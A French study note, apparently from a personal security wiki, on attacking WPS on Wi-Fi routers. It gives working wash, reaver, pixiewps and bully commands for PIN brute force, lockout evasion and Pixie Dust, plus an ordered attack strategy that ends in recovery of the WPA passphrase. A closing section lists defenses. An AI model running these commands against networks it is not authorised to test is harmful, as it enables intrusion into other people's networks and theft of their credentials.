---
title: "Attaques WPS"
domain: "Applied Sciences"
subdomain: "Computer Science > Security > Networking > Network Security > WiFi"
tags: [sciences-appliquées, informatique, sécurité, réseau, wifi, wps, reaver, pixie-dust]
date: "2026-05-17"
---

# Attaques WPS

WPS (Wi-Fi Protected Setup, 2006) permet d'associer un client par PIN à 8 chiffres ou par bouton (PBC). Le protocole est **structurellement vulnérable** : le PIN est validé en deux moitiés, ce qui réduit l'espace de recherche de 10^8 à **11 000 combinaisons** (10 000 + 1 000 - checksum).

## PIN — pourquoi 11 000 seulement

```
PIN = D1 D2 D3 D4 D5 D6 D7 C
       \-- 4 digits --/  \-- 3 + checksum --/

Étape 1 : tester D1..D4    → 10 000 essais max
Étape 2 : tester D5..D7    → 1 000 essais max
                            (C calculé par formule fixe)

Total : 11 000 essais → ~quelques heures à 1 essai/seconde
```

## Identifier les APs avec WPS activé

```bash
# Wash — scan dédié WPS
wash -i wlan0mon

# Colonnes :
# BSSID  Ch  dBm  WPS  Lck  Vendor  ESSID
# AA:..  6   -45  2.0  No   Realtek MaisonBox
# Lck = Locked → si "Yes", l'AP bloque les tentatives (rate-limit)
```

`Lck: No` = brute-force possible. `Lck: Yes` = essayer Pixie Dust ou attendre.

## Reaver — brute-force du PIN

```bash
# Attaque standard
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -v
# -v / -vv / -vvv pour le niveau de verbosité

# Avec délai entre tentatives (anti-lockout)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -v -d 5
# -d = délai (secondes) entre essais

# Forcer un canal fixe
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -v

# Reprendre une session (Reaver sauvegarde dans /etc/reaver/)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -s session.wpc

# Si l'AP locke après N tentatives → option pour gérer
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -L -v
# -L = ignore les notifications "locked", continue

# Tester un PIN précis (ex : récupéré ailleurs)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -p 12345670 -v
```

**Sortie réussie** :
```
[+] WPS PIN: '12345670'
[+] WPA PSK: 'MonMotDePasse123'
[+] AP SSID: 'MaisonBox'
```

Le PIN sert ensuite à récupérer **directement la PSK** (le client négocie la WPA-PSK via WPS).

## Pixie Dust Attack — exploitation des nonces

Sur de nombreux chipsets (Ralink, Realtek, Broadcom anciens), les nonces utilisés dans l'échange WPS sont **prédictibles** (RNG faible ou null). Cela permet de calculer le PIN **hors ligne** en quelques secondes, sans 11 000 tentatives.

```bash
# Reaver mode Pixie Dust
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -v
# -K 1 = mode Pixie Dust

# Capture les valeurs E-S1, E-S2, E-Hash1, E-Hash2 (un seul échange WPS)
# Puis appelle pixiewps en interne

# Manuellement avec pixiewps (depuis une capture)
pixiewps -e <PKE> -r <PKR> -s <E-Hash1> -z <E-Hash2> \
         -a <AuthKey> -n <E-Nonce>
```

**Sortie** : `[+] WPS pin: 12345670` → puis re-injecter dans reaver pour récupérer la PSK :

```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -p 12345670 -v
```

**Chipsets historiquement vulnérables** :
- Ralink RT2860 / RT3070 / RT3290
- Realtek RTL8xxx (firmwares anciens)
- Broadcom (certains modèles via patch)
- MediaTek (selon firmware)

## Bully — alternative à reaver

Implémentation indépendante, parfois plus stable sur certains chipsets.

```bash
# Brute-force standard
bully wlan0mon -b AA:BB:CC:DD:EE:FF -d -v 3
# -d = mode "dirty" (envoie sans confirmation EAP)
# -v 3 = verbosité

# Pixie Dust avec bully
bully wlan0mon -b AA:BB:CC:DD:EE:FF -d --pixiewps -v 3

# Forcer un canal
bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -v 3
```

## Stratégie d'attaque WPS

```
1. wash -i wlan0mon          # repérer APs avec WPS, vérifier Lck
2. reaver -K 1 -b BSSID      # tenter Pixie Dust en premier (rapide)
   → succès ? → étape 4
   → échec ?  → étape 3
3. reaver -b BSSID -d 5      # brute-force standard avec délai
4. reaver -p PIN_TROUVÉ      # extraire la PSK
```

## Contre-mesures côté défense

- **Désactiver WPS** dans l'admin de la box (souvent activé par défaut)
- Si nécessaire : forcer **WPS-PBC uniquement** (bouton physique, sans PIN)
- Vérifier le firmware (patches Pixie Dust pour chipsets vieux)
- Activer le **lockout permanent** après N tentatives (rare sur boxes grand public)
- Mieux : forcer **WPA3** qui n'a pas WPS

## Voir aussi

- [[03 - Attaques WPA2-PSK]] — si WPS désactivé, attaquer la PSK directement
- [[08 - Frameworks Tout-en-Un]] — airgeddon a un menu WPS dédié
- [[11 - Defense et Detection]] — désactivation et monitoring
